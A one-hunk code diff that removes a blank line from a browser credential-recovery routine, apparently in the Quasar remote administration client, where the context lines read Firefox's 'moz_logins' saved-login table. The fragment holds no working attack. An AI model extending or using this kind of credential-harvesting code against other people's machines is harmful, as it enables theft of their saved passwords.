@@ -65,7 +65,6 @@ namespace Quasar.Client.Recovery.Browsers
                                 return logins;
                             }
 
-
                             if (!sqlDatabase.ReadTable("moz_logins"))
                                 return logins;
 
